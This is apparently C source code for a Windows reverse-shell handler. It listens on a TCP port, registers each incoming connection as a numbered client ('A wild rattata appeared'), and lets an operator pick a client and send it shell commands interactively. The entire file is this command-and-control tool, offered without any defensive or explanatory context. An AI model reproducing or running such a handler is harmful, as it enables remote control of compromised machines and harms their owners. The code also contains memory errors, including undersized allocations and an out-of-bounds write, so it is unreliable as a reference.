#define _WIN32_WINNT 0x501

#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <ctype.h>

#define DEFAULT_PORT "8888"
#define DEFAULT_BUFLEN 4096
#define MAX_CLIENTS 20

typedef struct ThreadData
{
    SOCKET Listener;
} THREADDATA, *PTHREADDATA;

typedef struct ClientInfo
{
    int id;
    char *ip;
    SOCKET Socket;
} CLIENTINFO, *PCLIENTINFO;

PCLIENTINFO PClients[MAX_CLIENTS];
DWORD dwThreadIdArray[MAX_CLIENTS];
HANDLE hThreadArray[MAX_CLIENTS];
PTHREADDATA pDataArray[MAX_CLIENTS];
int THREADNBR;
char *PORT;
int link_client(CLIENTINFO *Client);
void init_client_thread(PTHREADDATA pclientdata);
SOCKET init_listener();
DWORD WINAPI init_client(LPVOID lpParam);
void logprint(char *type, char *message);
void intro();
void menu(int *server_initied);

int link_client(CLIENTINFO *Client)
{
    int iResult;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    int id = Client->id;
    for (;;)
    {
        iResult = recv(Client->Socket, recvbuf, recvbuflen, 0);
        if (iResult > 0)
        {
            printf("%s", recvbuf);
            memset(recvbuf, 0, 4096);
            recvbuf[0] = '\0';
            fgets(recvbuf, 4096, stdin);
            if (strcmp(recvbuf, "background\n") == 0)
            {
                send(Client->Socket, "", 2, 0);
                memset(recvbuf, 0, 4096);
                recvbuf[0] = '\0';
                break;
            }
            send(Client->Socket, recvbuf, strlen(recvbuf), 0);
            memset(recvbuf, 0, 4096);
            recvbuf[0] = '\0';
        }
        else
        {
            printf("Client unreachable : %d\n", WSAGetLastError());
            closesocket(Client->Socket);
            WSACleanup();

            free(PClients[id]);
            PClients[id] = malloc(sizeof(PCLIENTINFO));
            PClients[id]->id = 0;

            return 0;
        }
    }
    return 0;
}

void init_client_thread(PTHREADDATA pclientdata)
{
    hThreadArray[THREADNBR] = CreateThread(NULL, 0, init_client, pclientdata, 0, &dwThreadIdArray[THREADNBR]);
    THREADNBR++;
}

SOCKET init_listener()
{
    WSADATA wsaData;
    SOCKET ListenSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL;
    struct addrinfo hints;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;
    getaddrinfo(NULL, PORT, &hints, &result);
    ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
    freeaddrinfo(result);
    listen(ListenSocket, SOMAXCONN);

    return ListenSocket;
}

DWORD WINAPI init_client(LPVOID lpParam)
{
    SOCKET ClientSocket = INVALID_SOCKET;
    PTHREADDATA pData;
    struct sockaddr_in client;
    pData = (PTHREADDATA)lpParam;
    
    ClientSocket = accept(pData->Listener, (struct sockaddr *)&client, NULL);
    closesocket(pData->Listener);

    SOCKET listener = init_listener();
    
    pDataArray[THREADNBR] = (PTHREADDATA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PTHREADDATA));
    if (pDataArray[THREADNBR] == NULL)
    {
        ExitProcess(2);
    }
    pDataArray[THREADNBR]->Listener = listener;
    init_client_thread(pDataArray[THREADNBR]);

    for (int i = 1; i < MAX_CLIENTS; i++)
    {
        if (PClients[i]->id == 0)
        {
            PClients[i]->id = i;
            strcpy(PClients[i]->ip, inet_ntoa(client.sin_addr));
            PClients[i]->Socket = ClientSocket;
            printf("\nA wild rattata appeared - ID=%d IP=%s\n", PClients[i]->id, PClients[i]->ip);
            break;
        }
    }

    return 0;
}

void logprint(char *type, char *message)
{
    if (strcmp(type, "ERROR") == 0)
    {
        printf("[-] %s\n", message);
    }
    else if (strcmp(type, "SUCCESS") == 0)
    {
        printf("[+] %s\n", message);
    }
    else if (strcmp(type, "INFO") == 0)
    {
        printf("[i] %s\n", message);
    }
}

void intro(){
    printf(\
"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
"@                                       ./(/,                     @\n"
"@                                      ##(((/((((/                @\n"
"@                                      /(((((//,/(((*             @\n"
"@                                        ((/////  .(((*           @\n"
"@                                                    ,((          @\n"
"@                /(((*                                 ((         @\n"
"@               /*#,///.                                /(        @\n"
"@              ,,###/*,,..         .#####((.             ((       @\n"
"@              ,,*X#######(((((( #((**###(((              /       @\n"
"@              ####((#((((((((((((*#######//              /,      @\n"
"@           ,((((((((((((((,/./////XXXXX#(//              /.      @\n"
"@        .((((((((((/(/(#//@@*/////XXXXXX,/.*/(((((((((( (/       @\n"
"@         /((#XXXXXXX&@@X(((,/////,////(///(((((((((((((((        @\n"
"@          @(X&&&X,&XXXXXXXX&&(*.,*/((#(((((((((((((((((((,       @\n"
"@      *(((@@@@@,////(XXXXXXXXXX(/(((((((((((((((((((((((((       @\n"
"@  *#X*&X//,#@@,//*#(*#/XXXXXXXX&//((((((((((((((((((((((((*      @\n"
"@ *(,#(*       ..,*/*####/XXXXXX&*((((((((*(X@@&&&&(((((((///     @\n"
"@                   &XXXX/XX&   (((((((((##########X.(((////////. @\n"
"@                   X#(X&*    ,((((((((,//**            ,/////,(* @\n"
"@                            //(((((//,/                  (////.  @\n"
"@                           X&#////*                    /*X@*&@.  @\n"
"@                          @@(@X*                                 @\n"
"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
    printf("@ Welcome >>\n");
    printf("@ PORT = %s\n", PORT);
    printf("@ You want to change the default port ? Simply edit \"config.cfg\"\n");
    printf("@@@@@@@@@@@@@@@@\n\n");
}

void menu(int *server_initied)
{
    int choice = 0;

    if(*server_initied == 0){
        printf("\r1 - Start a new server.\n2 - View clients\n3 - Exit\nEnter choice : ");
    }else{
        printf("\r1 - Stop the server.\n2 - View clients\n3 - Exit\nEnter choice : ");
    }

    scanf("%d", &choice);
    if (choice == 1)
    {
        if(*server_initied == 0){
            SOCKET listener = init_listener();

            pDataArray[THREADNBR] = (PTHREADDATA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PTHREADDATA));
            if (pDataArray[THREADNBR] == NULL)
            {
                ExitProcess(2);
            }
            pDataArray[THREADNBR]->Listener = listener;

            init_client_thread(pDataArray[THREADNBR]);
            logprint("SUCCESS", "Successfuly started the server");
            *server_initied = 1;
        }else if(*server_initied == 1){
            // logprint("INFO", "This action will close all the clients, are you sure ? [1/0] : ");
            // scanf("%d", &choice);
            // if(choice == 1){
            //     for (int i = 1; i < MAX_CLIENTS; i++)
            //     {
            //         if (PClients[i]->id != 0)
            //         {
            //             closesocket(PClients[i]->Socket);
            //             WSACleanup();

            //             free(PClients[i]);
            //             PClients[i] = malloc(sizeof(PCLIENTINFO));
            //             PClients[i]->id = 0;
            //         }
            //     }

            //     // PCLIENTINFO PClients[MAX_CLIENTS];
            //     // DWORD dwThreadIdArray[MAX_CLIENTS];
            //     // HANDLE hThreadArray[MAX_CLIENTS];
            //     // PTHREADDATA pDataArray[MAX_CLIENTS];

            //     for (int i = THREADNBR; i < 0; i--)
            //     {
            //         TerminateThread(hThreadArray[i], 0);
            //         dwThreadIdArray[i] = 0;
            //         free(pDataArray[i]);
            //     }

            //     THREADNBR = 0;
            //     logprint("SUCCESS", "Successfuly stopped the server");
            //     *server_initied = 0;
            // }
        }
    }
    else if (choice == 2)
    {
        int trigger = 0;
        for (int i = 1; i < MAX_CLIENTS; i++)
        {
            if (PClients[i]->id)
            {
                trigger = 1;
                printf("%d Client IP %s\n", PClients[i]->id, PClients[i]->ip);
            }
        }
        if (trigger)
        {
            printf("Enter 0 to exit.\n");
            printf("Choose a client : ");
            scanf("%d", &choice);
            if (choice != 0)
            {
                link_client(PClients[choice]);
            }
        }
        else
        {
            logprint("INFO", "No client connected.");
        }
    }
    else if (choice == 3)
    {
        ExitProcess(1);
    }
}

int read_config()
{
    char *content = "PORT=8888";
    char *file_name = "SVW_options.cfg";

    FILE *fp;
    fp = fopen(file_name, "r");

    if (fp == NULL)
    {
        fp = fopen(file_name, "w");
        for (int i = 0; content[i] != '\0'; i++)
        {
            fputc(content[i], fp);
        }
        fclose(fp);
        return 0;
    }

    char buffer[11];
    char port[5];
    while(!feof(fp))
    {
        fread(buffer, 11, 1, fp);
    }
    fclose(fp);

    buffer[11] = '\0';
    
    int i = 0;
    while(isdigit((int)buffer[i+5])){
        port[i] = buffer[i+5];
        i++;
        if(i == 5){
            break;
        }
    }
    port[i] = '\0';
    strcpy(PORT, port);
    return 0;
}

int main(void)
{
    int server_initied = 0;
    THREADNBR = 0;
    PORT = malloc(5*sizeof(char));
    strcpy(PORT, DEFAULT_PORT);
    for (int i = 1; i < MAX_CLIENTS; i++)
    {
        PClients[i] = malloc(sizeof(PCLIENTINFO));
        PClients[i]->id = 0;
        PClients[i]->ip = malloc(16*sizeof(char));
    }

    read_config();

    intro();
    while (1)
    {
        menu(&server_initied);
    }

    return 0;
}